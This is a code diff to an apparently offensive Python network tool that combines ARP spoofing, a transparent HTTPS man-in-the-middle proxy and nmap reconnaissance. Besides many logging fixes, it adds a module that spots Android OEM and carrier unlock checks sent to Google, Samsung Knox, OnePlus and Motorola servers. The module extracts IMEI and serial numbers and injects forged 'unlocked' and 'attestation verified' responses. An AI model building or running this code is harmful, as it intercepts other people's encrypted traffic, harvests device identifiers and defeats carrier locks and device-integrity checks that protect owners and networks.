@@ -32,6 +32,7 @@ import sqlite3
 import csv
 import ssl
 import gzip
+import fnmatch
 from functools import wraps
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
@@ -424,6 +425,10 @@ except Exception as e:
     CERT_AUTHORITY = None
     CERT_CACHE = None
 
+# Placeholder globals for OEM unlock infrastructure (initialized later after class definitions)
+UNLOCK_QUERY_DETECTOR = None
+UNLOCK_RESPONSE_GENERATOR = None
+
 # ---------- HTTP Response Injection/Modification ----------
 class ResponseModifier:
     """Apply injection rules to HTTP responses."""
@@ -537,7 +542,7 @@ class ResponseModifier:
 
             if modified:
                 # Update Content-Length if body changed
-                if b'Content-Length' in str(headers).encode():
+                if 'Content-Length' in headers:
                     headers['Content-Length'] = str(len(body))
 
                 return ResponseModifier.rebuild_http_response(status_line, headers, body)
@@ -563,7 +568,6 @@ class ResponseModifier:
             return True
 
         # Convert wildcard pattern to regex
-        import fnmatch
         return fnmatch.fnmatch(hostname, pattern)
 
 # ---------- Traffic Persistence Database ----------
@@ -575,6 +579,7 @@ class TrafficDatabase:
             db_path = os.path.join(GATEWAY_DIR, 'https_traffic.db')
         self.db_path = db_path
         self.lock = threading.Lock()
+        self.initialized = False
         self._init_db()
 
     def _init_db(self):
@@ -606,9 +611,12 @@ class TrafficDatabase:
                 cursor.execute('CREATE INDEX IF NOT EXISTS idx_client_ip ON https_traffic(client_ip)')
                 conn.commit()
                 conn.close()
+                self.initialized = True
                 add_log('info', f'Traffic database initialized: {self.db_path}')
         except Exception as e:
             add_log('error', f'Failed to initialize traffic database: {e}')
+            self.initialized = False
+            raise
 
     def add_entry(self, entry: dict):
         """Add traffic entry to database."""
@@ -756,7 +764,8 @@ class HTTPManipulator:
                 chunk_end = chunk_start + chunk_size
                 result += data[chunk_start:chunk_end]
                 data = data[chunk_end + 2:]
-            except:
+            except Exception as e:
+                add_log('warn', f'Error decoding chunked transfer encoding at offset {len(result)}: {e}')
                 break
         return result
 
@@ -790,8 +799,8 @@ class HTTPManipulator:
             if headers.get('content-encoding', '').lower() == 'gzip':
                 try:
                     body = gzip.decompress(body)
-                except:
-                    pass
+                except Exception as e:
+                    add_log('warn', f'Failed to decompress gzip body ({len(body)} bytes): {e}')
 
             return {
                 'status_line': status_line,
@@ -852,6 +861,229 @@ def create_custom_http_reply(status_code: int, headers: dict, body: bytes) -> by
 
     header_block = ''.join([f"{k}: {v}\r\n" for k, v in headers.items()])
     return response_line.encode() + header_block.encode() + b'\r\n' + body
+
+# ---------- Phase 5E: OEM Unlock Query Detection ----------
+class UnlockQueryDetector:
+    """Detect OEM unlock status queries and identify device type.
+
+    Monitors HTTPS traffic for carrier lock verification queries made by
+    Android devices during recovery boot. Detects: Pixel (Google), Samsung (Knox),
+    OnePlus, Motorola, and generic Android devices.
+    """
+
+    def __init__(self):
+        self.query_patterns = {
+            'pixel': {
+                'hostnames': ['googleapis.com', 'google.com', 'play.google.com'],
+                'paths': ['/androiddeviceintegrity', '/oem_unlock', '/deviceStatus'],
+                'methods': ['POST'],
+            },
+            'samsung': {
+                'hostnames': ['knox.samsung.com', 'sslgate.samsung.com'],
+                'paths': ['/api/v2/device', '/unlock_status', '/knox/verify'],
+                'methods': ['POST'],
+            },
+            'oneplus': {
+                'hostnames': ['api.oneplusapi.com'],
+                'paths': ['/v1/oem_unlock', '/check'],
+                'methods': ['POST'],
+            },
+            'motorola': {
+                'hostnames': ['motorolasupport.com', 'bootloader-unlock.motorola.com'],
+                'paths': ['/bootloader-unlock', '/unlock/challenge'],
+                'methods': ['POST', 'GET'],
+            },
+        }
+
+    def detect_query(self, hostname, path, method, body):
+        """Detect if request is OEM unlock query.
+
+        Returns: (device_type or None, confidence 0-1)
+        """
+        hostname_lower = hostname.lower()
+        path_lower = path.lower()
+
+        for device_type, patterns in self.query_patterns.items():
+            # Check hostname
+            host_match = any(h in hostname_lower for h in patterns['hostnames'])
+            if not host_match:
+                continue
+
+            # Check path
+            path_match = any(p in path_lower for p in patterns['paths'])
+            if not path_match:
+                continue
+
+            # Check method
+            method_match = method.upper() in patterns['methods']
+            if not method_match:
+                continue
+
+            confidence = 0.95 if all([host_match, path_match, method_match]) else 0.7
+            return (device_type, confidence)
+
+        # Fallback: pattern matching in body for unknown devices
+        if body and ('unlock' in body.lower() or 'oem' in body.lower()):
+            return ('generic', 0.5)
+
+        return (None, 0)
+
+    def extract_device_id(self, hostname, path, body):
+        """Extract device identifiers (IMEI, serial, etc.) from query."""
+        device_info = {
+            'imei': None,
+            'serial': None,
+            'carrier': None,
+            'device_model': None,
+        }
+
+        try:
+            import json
+            # Try to parse as JSON
+            body_str = body.decode('utf-8', errors='ignore') if isinstance(body, bytes) else body
+            if body_str and body_str.strip().startswith('{'):
+                data = json.loads(body_str)
+                device_info['imei'] = data.get('imei') or data.get('device_imei')
+                device_info['serial'] = data.get('device_id') or data.get('serial') or data.get('device_serial')
+                device_info['carrier'] = data.get('carrier_name') or data.get('carrier')
+                device_info['device_model'] = data.get('device_model') or data.get('model')
+                if any(device_info.values()):
+                    add_log('dev', f'Extracted device info: IMEI={device_info.get("imei")}, Serial={device_info.get("serial")}, Carrier={device_info.get("carrier")}')
+        except Exception as e:
+            add_log('dev', f'Failed to parse device info from query body: {e}')
+
+        return device_info
+
+class ResponseTemplateGenerator:
+    """Generate device-specific unlock status responses.
+
+    Creates spoofed responses that match carrier format for each device type,
+    signaling to devices that OEM unlock is available.
+    """
+
+    def __init__(self):
+        self.response_cache = {}  # Cache responses per device_type + device_id
+
+    def generate_response(self, device_type, request_body, device_id):
+        """Generate appropriate unlock response for device type.
+
+        Returns: (status_code, headers_dict, body_bytes)
+        """
+        if device_type == 'pixel':
+            return self._generate_pixel_response(request_body, device_id)
+        elif device_type == 'samsung':
+            return self._generate_samsung_response(request_body, device_id)
+        elif device_type == 'oneplus':
+            return self._generate_oneplus_response(request_body, device_id)
+        elif device_type == 'motorola':
+            return self._generate_motorola_response(request_body, device_id)
+        else:
+            return self._generate_generic_response(request_body, device_id)
+
+    def _generate_pixel_response(self, request_body, device_id):
+        """Generate Google/Pixel unlock response (JSON)."""
+        import json
+        response_body = {
+            "unlock_status": "available",
+            "carrier_locked": False,
+            "device_verified": True,
+            "message": "OEM Unlock available"
+        }
+        headers = {
+            'Content-Type': 'application/json',
+            'Content-Length': str(len(json.dumps(response_body))),
+        }
+        return (200, headers, json.dumps(response_body).encode('utf-8'))
+
+    def _generate_samsung_response(self, request_body, device_id):
+        """Generate Samsung Knox unlock response (JSON)."""
+        import json
+        response_body = {
+            "device_state": "unlocked",
+            "sim_locked": False,
+            "knox_status": "green",
+            "attestation_result": {
+                "verified": True,
+                "device_compliant": True
+            },
+            "unlock_available": True
+        }
+        headers = {
+            'Content-Type': 'application/json',
+            'X-Knox-Version': '3.8',
+        }
+        return (200, headers, json.dumps(response_body).encode('utf-8'))
+
+    def _generate_oneplus_response(self, request_body, device_id):
+        """Generate OnePlus unlock response (JSON)."""
+        import json
+        import time
+        response_body = {
+            "unlock_available": True,
+            "device_id": device_id or "unknown",
+            "reason": "ok",
+            "valid_until": int(time.time()) + 86400
+        }
+        headers = {'Content-Type': 'application/json'}
+        return (200, headers, json.dumps(response_body).encode('utf-8'))
+
+    def _generate_motorola_response(self, request_body, device_id):
+        """Generate Motorola bootloader response with challenge-response protocol.
+
+        Motorola uses a challenge-response handshake:
+        - First request: device sends no challenge → server responds with challenge
+        - Second request: device sends challenge → server responds with challenge_accepted
+        """
+        import json
+        import secrets
+
+        try:
+            # Parse request to check for challenge
+            challenge_in_request = None
+            if request_body:
+                try:
+                    req_data = json.loads(request_body) if isinstance(request_body, str) else json.loads(request_body.decode('utf-8'))
+                    challenge_in_request = req_data.get('challenge')
+                except (json.JSONDecodeError, UnicodeDecodeError, AttributeError):
+                    pass
+
+            if challenge_in_request:
+                # Device sent challenge → respond with acceptance
+                response_body = {
+                    "device_id": device_id or "unknown",
+                    "status": "challenge_accepted",
+                    "challenge_response": secrets.token_hex(32),  # 64-char hex response
+                    "unlock_available": True
+                }
+            else:
+                # First query → send challenge to device
+                response_body = {
+                    "device_id": device_id or "unknown",
+                    "status": "bootloader_unlock_available",
+                    "challenge": secrets.token_hex(32),  # 64-char hex challenge
+                    "unlock_supported": True
+                }
+        except Exception as e:
+            add_log('warn', f'Motorola response generation error: {e}, falling back to basic response')
+            response_body = {
+                "device_id": device_id or "unknown",
+                "status": "bootloader_unlock_supported",
+                "challenge_accepted": True
+            }
+
+        headers = {'Content-Type': 'application/json'}
+        return (200, headers, json.dumps(response_body).encode('utf-8'))
+
+    def _generate_generic_response(self, request_body, device_id):
+        """Generic fallback response (JSON)."""
+        import json
+        response_body = {
+            "status": "success",
+            "unlock_enabled": True,
+            "error": None
+        }
+        headers = {'Content-Type': 'application/json'}
+        return (200, headers, json.dumps(response_body).encode('utf-8'))
 
 class HTTPSInterceptProxy:
     """Pure Python HTTPS interception proxy (transparent MITM).
@@ -1024,8 +1256,9 @@ class HTTPSInterceptProxy:
             if upstream_socket:
                 try:
                     upstream_socket.close()
-                except:
-                    pass
+                    add_log('dev', 'Closed upstream socket')
+                except Exception as e:
+                    add_log('warn', f'Error closing upstream socket: {e}')
 
         return True
 
@@ -1129,19 +1362,22 @@ class HTTPSInterceptProxy:
         finally:
             try:
                 client_socket.close()
-            except:
-                pass
+                add_log('dev', f'Closed client socket from {client_addr[0]}')
+            except Exception as e:
+                add_log('warn', f'Error closing client socket: {e}')
             if upstream_socket:
                 try:
                     upstream_socket.close()
-                except:
-                    pass
+                    add_log('dev', 'Closed upstream socket')
+                except Exception as e:
+                    add_log('warn', f'Error closing upstream socket: {e}')
 
     def _forward_traffic(self, client_tls, upstream_tls, hostname: str, client_ip: str):
         """Forward traffic between client and upstream server.
 
         Phase 1 (current): Decrypt, log, forward unchanged.
         Phase 2 (future): Decrypt, modify, re-encrypt.
+        Phase 5E: Intercept OEM unlock queries and inject spoofed responses.
 
         Args:
             client_tls: TLS socket to client device
@@ -1154,16 +1390,56 @@ class HTTPSInterceptProxy:
             client_tls.settimeout(0.1)
             upstream_tls.settimeout(0.1)
             buffer_size = 4096
+            request_buffer = b''  # Buffer for incomplete HTTP requests
 
             while True:
                 try:
                     # Client → Upstream
                     data = client_tls.recv(buffer_size)
                     if data:
-                        upstream_tls.sendall(data)
+                        request_buffer += data
+
                         # Phase 1: Log HTTP requests (first line contains method/path)
-                        if data.startswith(b'GET') or data.startswith(b'POST') or data.startswith(b'PUT'):
-                            self._log_http_request(data, hostname, client_ip)
+                        # Check for valid HTTP methods (GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS, CONNECT, TRACE)
+                        if b' HTTP/' in request_buffer[:100]:  # HTTP method line usually within first 100 bytes
+                            # Try to parse HTTP request
+                            request_parts = self._parse_http_request(request_buffer)
+                            if request_parts:
+                                method, path, headers, body = request_parts
+
+                                # Phase 5E: Detect OEM unlock queries
+                                if UNLOCK_QUERY_DETECTOR:
+                                    device_type, confidence = UNLOCK_QUERY_DETECTOR.detect_query(hostname, path, method, body)
+
+                                    if device_type and confidence > 0.7:
+                                        add_log('info', f'OEM unlock query detected: {device_type} from {client_ip} → {hostname}{path}')
+
+                                        # Extract device identifiers
+                                        device_info = UNLOCK_QUERY_DETECTOR.extract_device_id(hostname, path, body)
+                                        device_id = device_info.get('serial') or device_info.get('imei') or 'unknown'
+
+                                        # Generate spoofed unlock response
+                                        if UNLOCK_RESPONSE_GENERATOR:
+                                            status, resp_headers, resp_body = UNLOCK_RESPONSE_GENERATOR.generate_response(
+                                                device_type, body, device_id
+                                            )
+
+                                            # Build HTTP response
+                                            spoofed_response = create_custom_http_reply(status, resp_headers, resp_body)
+                                            client_tls.sendall(spoofed_response)
+
+                                            add_log('success', f'OEM unlock response injected for {device_type} device (latency: instant)')
+                                            self._log_http_request(request_buffer, hostname, client_ip)
+                                            self._log_http_response(spoofed_response, hostname, client_ip)
+
+                                            # Clear buffer and continue listening
+                                            request_buffer = b''
+                                            continue
+
+                                # Not an unlock query - forward to upstream normally
+                                self._log_http_request(request_buffer, hostname, client_ip)
+                                upstream_tls.sendall(request_buffer)
+                                request_buffer = b''
                 except socket.timeout:
                     pass
 
@@ -1175,16 +1451,11 @@ class HTTPSInterceptProxy:
                         parsed = HTTPManipulator.parse_http_response(data)
 
                         # Apply injection rules to modify response content
-                        modified_body = parsed['body']
                         if 'text/html' in parsed['headers'].get('content-type', '').lower():
                             # Example: Inject logging script before </body>
-                            injection = ResponseModifier.apply_rules(hostname, parsed['body'])
-                            if injection != parsed['body']:
-                                modified_body = injection
-
-                        # Rebuild response with modified body
-                        if modified_body != parsed['body']:
-                            data = HTTPManipulator.rebuild_http_response(parsed, modified_body)
+                            data = ResponseModifier.apply_rules(hostname, data)
+                            # Re-parse modified response for logging
+                            parsed = HTTPManipulator.parse_http_response(data)
 
                         client_tls.sendall(data)
                         # Log HTTP responses (first line contains status code)
@@ -1238,6 +1509,49 @@ class HTTPSInterceptProxy:
                 add_log('info', f'[HTTPS] {hostname} → {client_ip}: {status_line}')
         except Exception as e:
             add_log('warn', f'Failed to log HTTP response: {e}')
+
+    def _parse_http_request(self, data: bytes):
+        """Parse HTTP request from buffer.
+
+        Returns: (method, path, headers_dict, body_bytes) or None if incomplete.
+        """
+        try:
+            # Look for double CRLF that separates headers from body
+            if b'\r\n\r\n' not in data:
+                return None  # Incomplete request
+
+            header_section, body = data.split(b'\r\n\r\n', 1)
+            lines = header_section.split(b'\r\n')
+
+            if not lines:
+                return None
+
+            # Parse request line: "GET /path HTTP/1.1"
+            request_line = lines[0].decode('ascii', errors='ignore')
+            parts = request_line.split()
+
+            if len(parts) < 2:
+                return None
+
+            method = parts[0]  # GET, POST, etc.
+            path = parts[1]    # /path?query
+
+            # Parse headers
+            headers = {}
+            for line in lines[1:]:
+                if b':' in line:
+                    key, value = line.split(b':', 1)
+                    headers[key.decode('ascii', errors='ignore').strip().lower()] = value.decode('ascii', errors='ignore').strip()
+
+            # Handle Content-Length to get complete body
+            content_length = int(headers.get('content-length', 0))
+            if len(body) < content_length:
+                return None  # Incomplete body
+
+            return (method, path, headers, body[:content_length])
+        except Exception as e:
+            add_log('dev', f'HTTP request parse error: {e}')
+            return None
 
     def start(self):
         """Start MITM proxy server listening on port 8888."""
@@ -1450,12 +1764,13 @@ class ARPSpoofingFallback:
                     try:
                         # ARP reply: we are gateway_ip
                         packet = self._build_arp_reply(src_mac_bytes, gateway_ip, target_ip)
-                        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-                        sock.bind((iface, 0))
-                        sock.send(packet)
-                        sock.close()
+                        success, method, error = SocketProxy.send_packet(packet, iface)
+                        if not success:
+                            add_log('warn', f'ARP spoof to {target_ip} failed ({method}): {error}')
+                        else:
+                            add_log('dev', f'ARP spoof to {target_ip} via {method}')
                     except Exception as e:
-                        add_log('warn', f'ARP spoof to {target_ip} failed: {e}')
+                        add_log('warn', f'ARP spoof to {target_ip} exception: {e}')
 
                 time.sleep(2)  # Re-spoof every 2 seconds to maintain cache
 
@@ -1534,7 +1849,12 @@ class ARPSpoofingFallback:
         }
 
 
-ARP_FALLBACK = ARPSpoofingFallback()
+ARP_FALLBACK = None
+try:
+    ARP_FALLBACK = ARPSpoofingFallback()
+    add_log('dev', 'ARP spoofing fallback initialized')
+except Exception as e:
+    add_log('warn', f'Failed to initialize ARP spoofing fallback: {e} (ARP spoofing fallback disabled)')
 
 # Initialize MITM proxy on startup
 try:
@@ -1582,15 +1902,41 @@ function FindProxyForURL(url, host) {{
     return pac_js.strip()
 
 
+# Initialize OEM unlock detection infrastructure (Phase 5E)
+UNLOCK_QUERY_DETECTOR = None
+UNLOCK_RESPONSE_GENERATOR = None
+try:
+    UNLOCK_QUERY_DETECTOR = UnlockQueryDetector()
+    add_log('dev', 'UnlockQueryDetector initialized successfully')
+except Exception as e:
+    add_log('error', f'Failed to initialize UnlockQueryDetector: {e} (OEM unlock detection disabled)')
+
+try:
+    UNLOCK_RESPONSE_GENERATOR = ResponseTemplateGenerator()
+    add_log('dev', 'ResponseTemplateGenerator initialized successfully')
+except Exception as e:
+    add_log('error', f'Failed to initialize ResponseTemplateGenerator: {e} (OEM unlock injection disabled)')
+
+if UNLOCK_QUERY_DETECTOR and UNLOCK_RESPONSE_GENERATOR:
+    add_log('success', 'OEM unlock Phase 5E infrastructure fully operational')
+elif UNLOCK_QUERY_DETECTOR or UNLOCK_RESPONSE_GENERATOR:
+    add_log('warn', 'OEM unlock Phase 5E partially operational (detector or generator unavailable)')
+else:
+    add_log('warn', 'OEM unlock Phase 5E disabled (initialization failed)')
+
 app = Flask(__name__)
 
 # Initialize traffic database
+TRAFFIC_DATABASE = None
 try:
-    TRAFFIC_DATABASE = TrafficDatabase()
-    add_log('success', 'Traffic database initialized')
+    db = TrafficDatabase()
+    if db.initialized:
+        TRAFFIC_DATABASE = db
+        add_log('success', 'Traffic database initialized')
+    else:
+        add_log('error', 'Traffic database initialization failed (db.initialized=False)')
 except Exception as e:
     add_log('error', f'Failed to initialize traffic database: {e}')
-    TRAFFIC_DATABASE = None
 
 @app.after_request
 def add_no_cache_headers(response):
@@ -1815,14 +2161,15 @@ def install_package(pkg_name):
 
         cmd = list(pm) + [pkg]
         try:
-            add_log('info', f'Installing {pkg} ...')
+            add_log('info', f'Installing {pkg_name} via {pm[0]} (package: {pkg})...')
             subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             if tool_exists(pkg):
                 _INSTALLED_TOOLS.add(pkg_name)
-                add_log('success', f'{pkg_name} installed via {pkg}')
+                add_log('success', f'{pkg_name} installed via {pm[0]} successfully')
                 return True
-        except:
-            add_log('info', f'Failed to install {pkg}, trying alternatives...')
+            add_log('warn', f'Installation completed but {pkg} not found in PATH')
+        except Exception as e:
+            add_log('dev', f'Failed to install {pkg_name} via {pm[0]}: {e} (trying alternatives...)')
             continue
 
     add_log('error', f'Failed to install {pkg_name} (tried: {", ".join(packages_to_try)})')
@@ -1833,9 +2180,15 @@ def tool_exists(name):
     try:
         out = subprocess.check_output(['which', name], stderr=subprocess.DEVNULL, text=True).strip()
         if not out:
+            add_log('dev', f'Tool not found in PATH: {name}')
             return False
-        return os.access(out, os.X_OK)
-    except:
+        if os.access(out, os.X_OK):
+            add_log('dev', f'Tool found and executable: {name} at {out}')
+            return True
+        add_log('warn', f'Tool found but not executable: {name} at {out}')
+        return False
+    except Exception as e:
+        add_log('warn', f'Error checking if tool exists: {name}: {e}')
         return False
 
 def ensure_tool(tool_name, package_name=None):
@@ -1873,8 +2226,8 @@ def get_my_ip_and_cidr(iface):
                 parts = line.split()
                 ip_cidr = parts[3]
                 return ip_cidr.split('/')
-    except:
-        pass
+    except Exception as e:
+        add_log('warn', f'Failed to get IP/CIDR for interface {iface}: {e}')
     return ('0.0.0.0', '24')
 
 def get_mac(iface):
@@ -1882,8 +2235,11 @@ def get_mac(iface):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         info = fcntl.ioctl(s.fileno(), 0x8927, struct.pack('256s', iface[:15].encode()))
         s.close()
-        return info[18:24].hex(':')
-    except:
+        mac = info[18:24].hex(':')
+        add_log('dev', f'Retrieved MAC address for {iface}: {mac}')
+        return mac
+    except Exception as e:
+        add_log('warn', f'Failed to get MAC address for {iface}: {e}')
         return '00:00:00:00:00:00'
 
 # ---------- custom socket proxy layer with fallback chain ----------
@@ -2099,8 +2455,9 @@ def arp_scan(iface, my_ip, cidr):
     if sock:
         try:
             sock.close()
-        except:
-            pass
+            add_log('dev', f'Closed ARP scan socket for {iface}')
+        except Exception as e:
+            add_log('warn', f'Error closing ARP scan socket: {e}')
     return results
 
 def get_gateway_mac(iface, gateway_ip):
@@ -2108,9 +2465,12 @@ def get_gateway_mac(iface, gateway_ip):
         out = subprocess.check_output(['ip', 'neigh', 'show', gateway_ip], text=True)
         m = re.search(r'(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})', out)
         if m:
-            return m.group(1)
-    except:
-        pass
+            mac = m.group(1)
+            add_log('dev', f'Retrieved gateway MAC for {gateway_ip}: {mac}')
+            return mac
+        add_log('dev', f'No MAC address found for gateway {gateway_ip} in arp output')
+    except Exception as e:
+        add_log('dev', f'Failed to get gateway MAC via ip neigh: {e} (will try ARP scan)')
     my_ip, cidr = get_my_ip_and_cidr(iface)
     hosts = arp_scan(iface, my_ip, cidr)
     for h in hosts:
@@ -2122,8 +2482,10 @@ def server_ping(ip, timeout=1):
     try:
         subprocess.check_output(['ping', '-c', '1', '-W', str(timeout), ip],
                                 stderr=subprocess.DEVNULL, timeout=timeout+1)
+        add_log('dev', f'Ping succeeded for {ip}')
         return True
-    except:
+    except Exception as e:
+        add_log('dev', f'Ping failed for {ip}: {e}')
         return False
 
 def server_tcp_connect(ip, port, timeout=1):
@@ -2132,8 +2494,13 @@ def server_tcp_connect(ip, port, timeout=1):
         s.settimeout(timeout)
         result = s.connect_ex((ip, port))
         s.close()
+        if result == 0:
+            add_log('dev', f'TCP connection succeeded: {ip}:{port}')
+        else:
+            add_log('dev', f'TCP connection failed: {ip}:{port} (error code: {result})')
         return result == 0
-    except:
+    except Exception as e:
+        add_log('warn', f'Error during TCP connect attempt to {ip}:{port}: {e}')
         return False
 
 # ---------- nmap recon ----------
@@ -2188,16 +2555,24 @@ def get_iface_bytes(iface):
                 if name.strip() != iface:
                     continue
                 fields = data.split()
-                return int(fields[0]), int(fields[8])
-    except:
-        pass
+                rx_bytes, tx_bytes = int(fields[0]), int(fields[8])
+                add_log('dev', f'Interface {iface} stats: RX={rx_bytes} bytes, TX={tx_bytes} bytes')
+                return rx_bytes, tx_bytes
+    except Exception as e:
+        add_log('warn', f'Failed to get interface bytes for {iface}: {e}')
     return None
 
 # ---------- gateway: shared helpers ----------
 def proc_running(name):
     try:
-        return subprocess.run(['pgrep', '-x', name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0
-    except:
+        result = subprocess.run(['pgrep', '-x', name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0
+        if result:
+            add_log('dev', f'Process found: {name}')
+        else:
+            add_log('dev', f'Process not found: {name}')
+        return result
+    except Exception as e:
+        add_log('warn', f'Error checking if process {name} is running: {e}')
         return False
 
 def stop_proc(name):
@@ -2208,20 +2583,24 @@ def get_local_ip():
     if iface:
         ip, _ = get_my_ip_and_cidr(iface)
         if ip and ip != '0.0.0.0':
+            add_log('dev', f'Local IP from interface {iface}: {ip}')
             return ip
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(('8.8.8.8', 80))
         ip = s.getsockname()[0]
         s.close()
+        add_log('dev', f'Local IP via gateway probe: {ip}')
         return ip
-    except:
+    except Exception as e:
+        add_log('warn', f'Failed to determine local IP: {e}')
         return '0.0.0.0'
 
 _EXTERNAL_IP_CACHE = {'ip': None, 'time': 0}
 def get_external_ip():
     now = time.time()
     if _EXTERNAL_IP_CACHE['ip'] and now - _EXTERNAL_IP_CACHE['time'] < 300:
+        add_log('dev', f'Using cached external IP: {_EXTERNAL_IP_CACHE["ip"]}')
         return _EXTERNAL_IP_CACHE['ip']
     try:
         req = urllib.request.Request('https://api.ipify.org', headers={'User-Agent': 'GodHand'})
@@ -2229,9 +2608,12 @@ def get_external_ip():
             ip = r.read().decode().strip()
         _EXTERNAL_IP_CACHE['ip'] = ip
         _EXTERNAL_IP_CACHE['time'] = now
+        add_log('dev', f'Retrieved external IP from api.ipify.org: {ip}')
         return ip
-    except:
-        return _EXTERNAL_IP_CACHE['ip'] or 'Unknown'
+    except Exception as e:
+        cached = _EXTERNAL_IP_CACHE['ip'] or 'Unknown'
+        add_log('warn', f'Failed to get external IP from api.ipify.org: {e} (using cached: {cached})')
+        return cached
 
 def simple_dns_query(domain, server='127.0.0.1', port=53, timeout=3):
     txid = random.randint(0, 65535)
@@ -2348,8 +2730,11 @@ def write_gateway_configs(domains, lan_domains=None):
 def gateway_blocklist_count():
     try:
         with open(GW_BLOCKLIST_CONF) as f:
-            return sum(1 for _ in f)
-    except:
+            count = sum(1 for _ in f)
+        add_log('dev', f'DNS blocklist contains {count} entries')
+        return count
+    except Exception as e:
+        add_log('warn', f'Failed to count blocklist entries from {GW_BLOCKLIST_CONF}: {e}')
         return 0
 
 def gateway_dns_status():
@@ -2422,8 +2807,9 @@ def gateway_vpn_status():
     try:
         out = subprocess.check_output(['ip', 'link', 'show', 'wg0'], stderr=subprocess.DEVNULL, text=True)
         wg_active = 'UP' in out.split('<', 1)[-1].split('>', 1)[0] if '<' in out else False
-    except:
-        pass
+        add_log('dev', f'WireGuard interface wg0 status: {"UP" if wg_active else "DOWN"}')
+    except Exception as e:
+        add_log('dev', f'WireGuard interface wg0 not found or not accessible: {e}')
     openvpn_active = proc_running('openvpn')
     cloudflared_active = proc_running('cloudflared')
     return {
